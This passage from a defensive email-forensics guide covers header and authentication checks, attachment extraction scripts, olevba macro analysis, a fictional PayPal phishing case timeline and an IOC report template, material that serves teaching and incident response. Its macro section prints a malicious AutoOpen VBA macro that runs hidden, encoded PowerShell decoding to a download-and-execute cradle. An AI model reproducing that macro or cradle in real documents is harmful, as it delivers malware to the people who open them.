TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v
[... more base64 ...]

------=_Part_99999_1234567890--

ANALYSIS:
- Content-Type: application/octet-stream  ← Generic binary (suspicious!)
- Filename: Invoice_May2025.pdf           ← Looks like PDF...
- Base64 starts with TVqQ...              ← Decodes to MZ = Windows PE executable!
- Windows hides .exe extension by default ← Victim sees "Invoice_May2025.pdf"
```

### Python — Complete Attachment Extraction Script

```python
#!/usr/bin/env python3
"""
Email Attachment Extractor & Analyzer
Run in isolated VM only!
Usage: python3 extract_attachments.py suspicious.eml
"""

import email
import hashlib
import os
import sys
import magic  # pip install python-magic
from email import policy
from datetime import datetime

def get_hashes(data: bytes) -> dict:
    return {
        'md5':    hashlib.md5(data).hexdigest(),
        'sha1':   hashlib.sha1(data).hexdigest(),
        'sha256': hashlib.sha256(data).hexdigest(),
    }

def analyze_email(filepath: str):
    print(f"\n{'='*60}")
    print(f"EMAIL FORENSIC ANALYSIS")
    print(f"File: {filepath}")
    print(f"Time: {datetime.utcnow().isoformat()}Z")
    print(f"{'='*60}\n")
    
    with open(filepath, 'rb') as f:
        raw = f.read()
    
    # Hash the original email file
    email_hashes = get_hashes(raw)
    print(f"[EMAIL INTEGRITY]")
    print(f"  SHA256: {email_hashes['sha256']}")
    print(f"  MD5:    {email_hashes['md5']}\n")
    
    msg = email.message_from_bytes(raw, policy=policy.default)
    
    # Header Analysis
    print("[HEADERS]")
    print(f"  From:       {msg.get('from', 'NOT FOUND')}")
    print(f"  Reply-To:   {msg.get('reply-to', 'NOT SET')}")
    print(f"  Return-Path:{msg.get('return-path', 'NOT FOUND')}")
    print(f"  To:         {msg.get('to', 'NOT FOUND')}")
    print(f"  Subject:    {msg.get('subject', 'NOT FOUND')}")
    print(f"  Date:       {msg.get('date', 'NOT FOUND')}")
    print(f"  Message-ID: {msg.get('message-id', 'NOT FOUND')}")
    print(f"  X-Orig-IP:  {msg.get('x-originating-ip', 'NOT PRESENT')}\n")
    
    # Authentication
    auth = msg.get('authentication-results', 'NOT FOUND')
    print(f"[AUTHENTICATION]\n  {auth}\n")
    
    # Attachments
    print("[ATTACHMENTS]")
    attachment_count = 0
    
    for part in msg.walk():
        if part.get_content_disposition() == 'attachment':
            attachment_count += 1
            filename = part.get_filename() or f"attachment_{attachment_count}"
            payload = part.get_payload(decode=True)
            
            if payload is None:
                print(f"  [{attachment_count}] {filename} — Could not decode payload")
                continue
            
            # Get true file type (ignores extension — critical!)
            true_type = magic.from_buffer(payload, mime=True)
            stated_type = part.get_content_type()
            
            # Check extension vs magic bytes
            ext = os.path.splitext(filename)[1].lower()
            type_mismatch = False
            dangerous_types = ['application/x-dosexec', 'application/x-msdownload',
                              'application/x-executable', 'application/x-sharedlib']
            if true_type in dangerous_types:
                type_mismatch = True
            
            hashes = get_hashes(payload)
            
            print(f"\n  [{attachment_count}] Filename:    {filename}")
            print(f"       Stated type: {stated_type}")
            print(f"       TRUE type:   {true_type}  {'⚠️ EXECUTABLE!' if type_mismatch else ''}")
            print(f"       Size:        {len(payload):,} bytes")
            print(f"       MD5:         {hashes['md5']}")
            print(f"       SHA1:        {hashes['sha1']}")
            print(f"       SHA256:      {hashes['sha256']}")
            print(f"       → Search SHA256 on VirusTotal!")
            
            # Save for further analysis
            save_path = f"/tmp/forensic_{filename}"
            with open(save_path, 'wb') as f_out:
                f_out.write(payload)
            print(f"       Saved to:    {save_path}")
    
    if attachment_count == 0:
        print("  No attachments found")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 extract_attachments.py email.eml")
        sys.exit(1)
    analyze_email(sys.argv[1])
```

### File Magic Bytes Reference

```
# Check magic bytes manually:
xxd attachment.pdf | head -2
# Output first bytes — compare to table below:

FILE TYPE              HEX MAGIC BYTES            ASCII
─────────────────────────────────────────────────────────
PDF                    25 50 44 46                %PDF
Windows EXE/DLL        4D 5A                      MZ
ZIP (& DOCX/XLSX/PPTX) 50 4B 03 04                PK..
RAR archive            52 61 72 21 1A 07          Rar!..
GZIP                   1F 8B                      ..
7-ZIP                  37 7A BC AF 27 1C           7z¼¯'.
ISO image              43 44 30 30 31              CD001
PNG image              89 50 4E 47 0D 0A 1A 0A    .PNG....
JPEG image             FF D8 FF                   ÿØÿ
GIF image              47 49 46 38                GIF8
OLE2 (DOC/XLS/PPT)     D0 CF 11 E0 A1 B1 1A E1   ÐÏ.à¡±..
ELF (Linux executable) 7F 45 4C 46                .ELF
Java CLASS             CA FE BA BE                Êþº¾
Mach-O (macOS)         CF FA ED FE                Ïú
```

### Macro Analysis with oletools

```bash
# Install oletools
pip install oletools

# Check if file has macros
olevba --reveal Invoice_April.doc

# ─── Output ───
Filename:         Invoice_April.doc
Type:             OLE
Nb VBA code:      1 VBA module(s) found
VBA Code:
  Module: ThisDocument

VBA MACRO ThisDocument
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when document is opened                 |
|Suspicious|Shell               |May run an executable file or a system command|
|Suspicious|CreateObject        |May create OLE/COM object                    |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|EncodedCommand      |Obfuscated command with Base64 encoding      |
|IOC       |185.220.101.45      |IPv4 address                                 |
|IOC       |http://evil.ru/drop |URL                                          |
+----------+--------------------+---------------------------------------------+

EXTRACTED MACRO CODE:
Sub AutoOpen()
    Dim cmd As String
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    cmd = "powershell -WindowStyle Hidden -EncodedCommand " & _
          "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4" & _
          "AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAo"
    wsh.Run cmd, 0, False
    ' 0 = hidden window, False = don't wait
End Sub

# Decode the PowerShell base64:
python3 -c "
import base64
encoded = 'aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAo'
decoded = base64.b64decode(encoded).decode('utf-16-le')
print(decoded)
"
# Output: iex ((new-object net.webclient).downloadstring(
# = Downloads and executes another script from internet!
```

---

## 🛠️ Tools Arsenal

### Online Tools

| Tool | URL | Category | Use For |
|---|---|---|---|
| **MXToolbox** | mxtoolbox.com | Header Analyzer | Full header analysis, SPF/DKIM/DMARC checks, blacklist lookup |
| **Google Admin Toolbox** | toolbox.googleapps.com/apps/messageheader | Header Analyzer | Gmail-specific header visualization with hop delay display |
| **Mail Header Analyzer** | mailheader.org | Header Analyzer | Clean hop-by-hop visualization |
| **VirusTotal** | virustotal.com | Threat Intel | IP/domain/URL/file hash scanning against 70+ AV engines |
| **AbuseIPDB** | abuseipdb.com | Threat Intel | Community IP reputation database |
| **Shodan** | shodan.io | OSINT | Internet scan data — see what services an IP exposes |
| **Censys** | censys.io | OSINT | Internet asset discovery and certificate analysis |
| **Any.Run** | any.run | Sandbox | Interactive malware sandbox (watch execution in real time) |
| **Joe Sandbox** | joesandbox.com | Sandbox | Deep behavioral malware analysis |
| **Hybrid Analysis** | hybrid-analysis.com | Sandbox | Free malware sandbox with MITRE ATT&CK mapping |
| **URLScan.io** | urlscan.io | URL Analysis | Screenshot + resource analysis of URLs |
| **IPinfo** | ipinfo.io | Geolocation | IP geolocation, ASN, and hosting provider |
| **WHOIS Lookup** | whois.domaintools.com | WHOIS | Domain registration details and history |
| **Spamhaus Check** | spamhaus.org/lookup | Blacklists | Check IP/domain against all Spamhaus lists |
| **PhishTank** | phishtank.com | Phishing DB | Submit and check known phishing URLs |
| **APWG eCrimeX** | ecrimex.net | Reporting | Report phishing to Anti-Phishing Working Group |
| **EmailRep** | emailrep.io | Reputation | Email address risk scoring and intelligence |
| **Hunter.io** | hunter.io | OSINT | Find email formats and validate addresses |

---

### Command Line Tools

```bash
# ── INSTALLATION ──────────────────────────────────────────────────

# Email analysis
pip install mail-parser eml_analyzer python-magic oletools

# DNS tools (usually pre-installed on Linux)
apt-get install dnsutils whois

# ExifTool (metadata extraction)
apt-get install exiftool
# or: https://exiftool.org/

# Network analysis
apt-get install nmap traceroute

# ── USAGE EXAMPLES ────────────────────────────────────────────────

# 1. Parse email with mail-parser
python3 -c "
import mailparser
mail = mailparser.parse_from_file('email.eml')
print('From:', mail.from_)
print('Subject:', mail.subject)
print('Received:', mail.received)
print('Attachments:', len(mail.attachments))
for a in mail.attachments:
    print(f'  - {a[\"filename\"]} ({a[\"mail_content_type\"]})')
"

# 2. Quick header extraction
python3 -c "
import email
with open('email.eml','rb') as f:
    msg = email.message_from_binary_file(f)
for key in ['from','to','subject','date','reply-to','return-path','message-id']:
    print(f'{key:15}: {msg.get(key, \"NOT FOUND\")}')
print()
for received in msg.get_all('received', []):
    print('RECEIVED:', received[:120])
"

# 3. SPF check via DNS
dig TXT paypal.com | grep spf
dig TXT _dmarc.paypal.com
dig TXT selector1._domainkey.paypal.com

# 4. WHOIS + geolocation
whois 185.220.101.45
curl -s ipinfo.io/185.220.101.45

# 5. Macro analysis
olevba --reveal suspicious.doc
mraptor suspicious.doc  # Check for AutoRun macros specifically

# 6. Metadata from attachments
exiftool Invoice.pdf
# Shows: Author, Creator Tool, Create Date, Modify Date, PDF Version

# 7. File type detection (never trust extensions)
file attachment.pdf
xxd attachment.pdf | head -3

# 8. Hash file for evidence
sha256sum suspicious.eml > suspicious.eml.sha256
md5sum suspicious.eml

# 9. URL analysis (defang first)
python3 -c "
from urllib.parse import urlparse
url = 'https://paypal.com.evil-phisher.ru/login?token=abc'
p = urlparse(url)
print(f'Scheme:   {p.scheme}')
print(f'Netloc:   {p.netloc}')      # This is the ACTUAL domain
print(f'Path:     {p.path}')
print(f'Query:    {p.query}')
print(f'Domain:   {\".\".join(p.netloc.split(\".\")[-2:])}')  # eTLD+1
"
```

### Python Forensic Toolkit

```python
#!/usr/bin/env python3
"""
Comprehensive Email Forensics Toolkit
Install: pip install mail-parser python-magic requests dnspython geoip2
"""

import email
import hashlib
import re
import socket
import requests
import dns.resolver
from email import policy
from urllib.parse import urlparse

class EmailForensics:
    
    def __init__(self, filepath):
        with open(filepath, 'rb') as f:
            raw = f.read()
        self.raw = raw
        self.msg = email.message_from_bytes(raw, policy=policy.default)
        self.email_sha256 = hashlib.sha256(raw).hexdigest()
    
    def extract_ips(self):
        """Extract all public IPs from Received headers"""
        private_ranges = [
            re.compile(r'^(10|127|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.'),
        ]
        ips = []
        for received in self.msg.get_all('received', []):
            found = re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', received)
            for ip in found:
                if not any(p.match(ip) for p in private_ranges):
                    ips.append(ip)
        return list(set(ips))
    
    def extract_urls(self):
        """Extract and analyze all URLs from email body"""
        urls = []
        for part in self.msg.walk():
            if part.get_content_type() in ['text/html', 'text/plain']:
                body = part.get_payload(decode=True)
                if body:
                    found = re.findall(
                        r'https?://[^\s<>"\')\]]+', 
                        body.decode('utf-8', errors='ignore')
                    )
                    urls.extend(found)
        return list(set(urls))
    
    def check_spf(self, domain):
        """Query SPF DNS record"""
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata)
                if 'v=spf1' in txt:
                    return txt
            return "No SPF record found"
        except Exception as e:
            return f"Error: {e}"
    
    def check_dmarc(self, domain):
        """Query DMARC DNS record"""
        try:
            answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            return str(answers[0])
        except Exception as e:
            return f"No DMARC record: {e}"
    
    def geolocate_ip(self, ip):
        """Get geolocation for an IP"""
        try:
            r = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
            data = r.json()
            return {
                'ip': ip,
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'org': data.get('org', 'Unknown'),
                'loc': data.get('loc', 'Unknown'),
            }
        except Exception as e:
            return {'ip': ip, 'error': str(e)}
    
    def full_report(self):
        """Generate complete forensic report"""
        report = []
        report.append("=" * 60)
        report.append("EMAIL FORENSIC REPORT")
        report.append("=" * 60)
        
        # Headers
        report.append(f"\n[EVIDENCE HASH]")
        report.append(f"  SHA256: {self.email_sha256}")
        
        report.append(f"\n[KEY HEADERS]")
        for field in ['from', 'reply-to', 'return-path', 'to', 'subject', 
                      'date', 'message-id', 'x-originating-ip']:
            report.append(f"  {field:20}: {self.msg.get(field, 'NOT FOUND')}")
        
        # Auth results
        report.append(f"\n[AUTHENTICATION]")
        auth = self.msg.get('authentication-results', 'NOT FOUND')
        report.append(f"  {auth}")
        
        # IPs
        report.append(f"\n[PUBLIC IPs FOUND]")
        ips = self.extract_ips()
        for ip in ips:
            geo = self.geolocate_ip(ip)
            report.append(f"  {ip} → {geo.get('city')}, {geo.get('country')} | {geo.get('org')}")
        
        # URLs
        report.append(f"\n[URLs FOUND]")
        urls = self.extract_urls()
        for url in urls[:10]:  # Limit to first 10
            parsed = urlparse(url)
            defanged = url.replace('http','hxxp').replace('.','[.]')
            report.append(f"  Domain: {parsed.netloc}")
            report.append(f"  URL:    {defanged}")
        
        # SPF/DMARC check
        from_header = self.msg.get('from', '')
        domain_match = re.search(r'@([\w.-]+)', from_header)
        if domain_match:
            domain = domain_match.group(1)
            report.append(f"\n[DNS CHECKS for {domain}]")
            report.append(f"  SPF:   {self.check_spf(domain)}")
            report.append(f"  DMARC: {self.check_dmarc(domain)}")
        
        return '\n'.join(report)


# Usage:
# ef = EmailForensics('suspicious.eml')
# print(ef.full_report())
```

---

## ⏱️ Building Investigation Timeline

### Complete Real Case Timeline

```
╔══════════════════════════════════════════════════════════════════╗
║            PHISHING CASE #2025-047 — FULL TIMELINE              ║
╚══════════════════════════════════════════════════════════════════╝

PRE-ATTACK PREPARATION:
─────────────────────────────────────────────────────────────────
2025-05-10 (UNKNOWN TIME UTC)
  → Domain registered: paypal-secure-verify.com
    Registrar: Namecheap (privacy protection enabled)
    Hosting: DigitalOcean NYC1 datacenter
    WHOIS registration deliberately anonymized

2025-05-12 14:33:00 UTC
  → Phishing page deployed at:
    https://paypal-secure-verify.com/account/login
    Certificate: Let's Encrypt (free, issued automatically)
    [Evidence: URLScan.io passive scan captured at this time]

ATTACK EXECUTION:
─────────────────────────────────────────────────────────────────
2025-05-15 21:13:55 +0300 (18:13:55 UTC)
  → Phishing email composed and sent
    Sending IP: 185.220.101.45 (Tor Exit Node, Netherlands)
    Sending server: mail.evil-sender.ru
    From (spoofed): "PayPal Security" <security@paypal.com>
    Subject: "Urgent: Your PayPal account has been temporarily limited"

2025-05-15 09:14:01 -0700 (16:14:01 UTC)
  → Email relayed through mail.evil-sender.ru → internet
    [Received header hop 2]

2025-05-15 09:14:22 -0700 (16:14:22 UTC)
  → Email received by mx.victim-corp.com
    SPF: FAIL, DKIM: FAIL, DMARC: FAIL (p=none — no enforcement)
    ⚠ Spam filter scored 4.2/10 — below quarantine threshold (6.0)
    Email delivered to inbox.

VICTIM INTERACTION:
─────────────────────────────────────────────────────────────────
2025-05-15 09:17:03 PDT (16:17:03 UTC)
  → victim@victim-corp.com opens email
    [Evidence: Exchange Server access log, IP: 10.1.4.23 (internal)]

2025-05-15 09:18:41 PDT (16:18:41 UTC)
  → Victim clicks link in email
    Outbound proxy log shows request to paypal-secure-verify.com
    Victim's external IP: 203.0.113.27 (victim-corp.com egress)

2025-05-15 09:19:15 PDT (16:19:15 UTC)
  → Victim submits credentials on phishing page
    [Evidence: Web proxy SSL inspection log]
    Captured: email address + password + "security question"

POST-COMPROMISE:
─────────────────────────────────────────────────────────────────
2025-05-15 16:22:00 UTC (8 minutes after credential capture)
  → Attacker logs into victim's real PayPal account
    Login IP: 91.108.4.111 (different from sending IP)
    → This is a Telegram datacenter / second VPN layer
    Country: Netherlands (same as Tor exit — likely same actor)
    
2025-05-15 16:23:47 UTC
  → Attacker adds new bank account to PayPal profile

2025-05-15 16:25:12 UTC
  → Money transfer initiated: $2,340 USD

2025-05-15 16:31:00 UTC
  → Transfer completed to attacker's mule account
    Bank: First National (account ending in 4891)

DETECTION & RESPONSE:
─────────────────────────────────────────────────────────────────
2025-05-15 17:05:00 UTC
  → Victim notices fraudulent transaction, reports to IT
  
2025-05-15 17:12:00 UTC
  → SOC analyst begins investigation (this forensic report)
  
2025-05-15 17:45:00 UTC
  → Phishing domain reported to Google Safe Browsing, APWG
  
2025-05-15 18:30:00 UTC
  → DigitalOcean abuse report submitted for server takedown
```

---

### IOC (Indicators of Compromise) Report Template

```markdown
# INCIDENT REPORT — Email Forensics
─────────────────────────────────────────────────────────
Case ID:        2025-047
Analyst:        [Your Name]
Date:           2025-05-15
Classification: CONFIDENTIAL
Incident Type:  Phishing / Credential Harvesting / Financial Fraud
Severity:       HIGH

## SENDER DETAILS
| Field | Value |
|-------|-------|
| Display Name | PayPal Security |
| From Address | security@paypal.com (SPOOFED) |
| Actual Domain | evil-sender.ru |
| Domain Created | 2025-05-10 (5 days before attack) |
| Registrar | Namecheap, Inc. |

## NETWORK INDICATORS OF COMPROMISE (IOCs)
| Type | Value | Context |
|------|-------|---------|
| IP | 185.220.101.45 | Sending IP — Tor Exit Node (NL) |
| IP | 91.108.4.111 | Account login IP — Telegram DC (NL) |
| Domain | paypal-secure-verify.com | Phishing landing page |
| Domain | evil-sender.ru | Sending mail server |
| URL | hxxps://paypal-secure-verify[.]com/account/login | Credential harvest page |

## AUTHENTICATION
| Check | Result | Notes |
|-------|--------|-------|
| SPF | FAIL | 185.220.101.45 not in paypal.com SPF |
| DKIM | FAIL | Signature invalid — likely forged |
| DMARC | FAIL (pass-through) | p=none — no enforcement |

## FILE HASHES (if attachments present)
| Filename | SHA256 | Type |
|----------|--------|------|
| N/A | N/A | No attachments |

## TIMELINE SUMMARY
- 16:13 UTC — Email sent via Tor from evil-sender.ru
- 16:14 UTC — Email received, auth all fails, delivered to inbox
- 16:17 UTC — Victim opens email
- 16:19 UTC — Victim submits credentials to phishing page
- 16:22 UTC — Attacker uses credentials on real PayPal
- 16:31 UTC — $2,340 transferred out

## ACTIONS TAKEN
- [x] Phishing domain reported to APWG and Google Safe Browsing
- [x] Sending domain reported to Namecheap abuse
- [x] Hosting server reported to DigitalOcean abuse
- [x] PayPal security team notified with IOCs
- [x] Victim account password force-reset
- [x] Internal SPAM filter threshold adjusted from 6.0 to 5.0

## RECOMMENDATIONS
1. Enforce DMARC p=reject on victim-corp.com (currently p=none)
2. Enable browser link preview / Safe Browsing in email client
3. Deploy MFA on all financial service accounts
4. User awareness training on PayPal phishing patterns
```

---

## ✅ Investigation Checklist SOP

### Phase 1 — Evidence Acquisition

- [ ] Obtain written authorization to investigate
- [ ] Export raw `.eml` file — do not modify original
- [ ] Calculate `sha256sum email.eml` and document hash
- [ ] Create forensic copy — work only on copy
- [ ] Document who provided email and chain of custody
- [ ] Note date/time of acquisition (UTC)

### Phase 2 — Header Analysis

- [ ] Extract complete raw headers
- [ ] Map all `Received:` hops (bottom to top)
- [ ] Extract all public IP addresses from Received headers
- [ ] Compare timestamps across all hops (check for anomalies > 120s)
- [ ] Compare `Date:` timezone vs. `Received:` timestamps
- [ ] Document `From:` display name vs actual address
- [ ] Check if `Reply-To:` differs from `From:`
- [ ] Check if `Return-Path:` differs from `From:` domain
- [ ] Compare `Message-ID:` domain to `From:` domain
- [ ] Note `X-Originating-IP:` if present
- [ ] Note `X-Mailer:` / sending software

### Phase 3 — Authentication Verification

- [ ] Read `Authentication-Results:` header completely
- [ ] Document SPF result (pass / fail / softfail / none)
- [ ] Document DKIM result and check d= domain alignment
- [ ] Document DMARC result and note policy (none/quarantine/reject)
- [ ] Manually query: `dig TXT sender-domain.com` (SPF)
- [ ] Manually query: `dig TXT _dmarc.sender-domain.com` (DMARC)
- [ ] Manually query: `dig TXT selector._domainkey.sender-domain.com` (DKIM key)

### Phase 4 — IP Investigation

- [ ] Run `whois EACH_IP` and document ASN, org, country
- [ ] Identify if any IP is Tor exit node / VPN / hosting provider
- [ ] Run geolocation lookup on each public IP
- [ ] Check each IP against VirusTotal
- [ ] Check each IP against AbuseIPDB
- [ ] Check each IP against Spamhaus
- [ ] Reverse DNS: `host IP` for each public IP
- [ ] Note geographic location vs. claimed sender location

### Phase 5 — Content Analysis

- [ ] Examine `From:` display name vs. actual domain carefully
- [ ] Test domain for homograph characters (IDN punycode check)
- [ ] Check domain registration date (WHOIS)
- [ ] Defang all URLs found in email body
- [ ] Analyze URL structure (is target brand in path, not domain?)
- [ ] Submit URLs to URLScan.io and VirusTotal
- [ ] Identify social engineering techniques (urgency, fear, authority)
- [ ] Extract all attachments with `email` Python module
- [ ] Hash all attachments (SHA256)
- [ ] Check true file type with `file` or `python-magic` (magic bytes)
- [ ] Compare file extension vs true file type
- [ ] Submit hashes to VirusTotal
- [ ] Run `olevba` on all Office files
- [ ] Run `exiftool` on attachments for metadata

### Phase 6 — Documentation & Reporting

- [ ] Write complete IOC report
- [ ] Document full timeline with UTC timestamps
- [ ] Defang all IOCs in report (URLs, domains)
- [ ] Submit phishing domain to APWG eCrimeX
- [ ] Submit phishing URL to Google Safe Browsing
- [ ] Report malicious IPs to AbuseIPDB
- [ ] Report hosting abuse to provider
- [ ] Submit malware samples to VirusTotal (if applicable)
- [ ] Preserve all evidence with hash verification
- [ ] Deliver report to IR team / legal team

---

## 🚩 Red Flag Quick Reference

> [!danger] Immediate Red Flags — Investigate Right Now

| Indicator | Risk | Action |
|---|---|---|
| SPF=fail + DKIM=fail + DMARC=fail | 🔴 Critical | Almost certainly phishing |
| Reply-To differs from From domain | 🔴 Critical | Replies go to attacker |
| Attachment magic bytes ≠ extension | 🔴 Critical | Disguised malware |
| VBA macro with AutoOpen + Shell/PowerShell | 🔴 Critical | Malicious macro |
| Sending IP is Tor exit node | 🔴 High | Deliberate anonymization |
| Domain registered < 30 days ago | 🟡 Medium-High | Throwaway phishing domain |
| Message-ID domain ≠ From domain | 🟡 Medium | Different sending infrastructure |
| Timezone mismatch in headers | 🟡 Medium | Date header likely forged |
| Sending IP in hosting datacenter (not residential) | 🟡 Medium | Likely rented attack server |
| Return-Path domain ≠ From domain | 🟡 Medium | Bounce monitoring by attacker |
| AbuseIPDB score > 80 | 🔴 High | Known malicious IP |
| VirusTotal: 5+ vendors flagged IP/domain | 🔴 High | Known malicious infrastructure |
| Unicode/Punycode in domain | 🔴 High | Homograph attack |
| Target brand name in URL path, not domain | 🔴 Critical | Subdomain confusion attack |
| No DKIM signature on corporate email | 🟡 Medium | Unusual — most corporates sign |
| DMARC p=none on impersonated domain | 🟡 Context | Domain owner lacks enforcement |

---

## 📚 Further Reading & Resources

### Standards & RFCs

| RFC | Title |
|---|---|
| RFC 5321 | SMTP — Simple Mail Transfer Protocol |
| RFC 5322 | Internet Message Format (email headers) |
| RFC 7208 | SPF — Sender Policy Framework |
| RFC 6376 | DKIM — DomainKeys Identified Mail |
| RFC 7489 | DMARC — Domain-based Message Authentication |
| RFC 3464 | Delivery Status Notifications (bounce format) |

### Learning Resources

- **SANS FOR572** — Network Forensics course (email forensics section)
- **PhishTank** — Real phishing database to study active campaigns
- **MITRE ATT&CK T1566** — Phishing technique documentation
- **Google Project Zero Blog** — Advanced email security research
- **APWG eCrime Symposium Papers** — Academic phishing research

### Threat Intelligence Feeds

```bash
# Spamhaus Block List (SBL) — known spam sources
https://www.spamhaus.org/sbl/

# Emerging Threats (Proofpoint) — open rules
https://rules.emergingthreats.net/

# PhishTank API — check URLs against known phishing
https://checkurl.phishtank.com/checkurl/

# URLhaus (abuse.ch) — malware distribution URLs
https://urlhaus-api.abuse.ch/

# ThreatFox (abuse.ch) — IOC database
https://threatfox.abuse.ch/
```

---

*Note: All IP addresses, domains, and examples in this document are either fictional, documented malicious infrastructure, or taken from public threat intelligence. Never interact with malicious URLs or infrastructure during investigation without proper isolation.*

---

**Tags:** #email-forensics #dfir #cybersecurity #phishing #spf #dkim #dmarc #incident-response #blue-team #threat-analysis
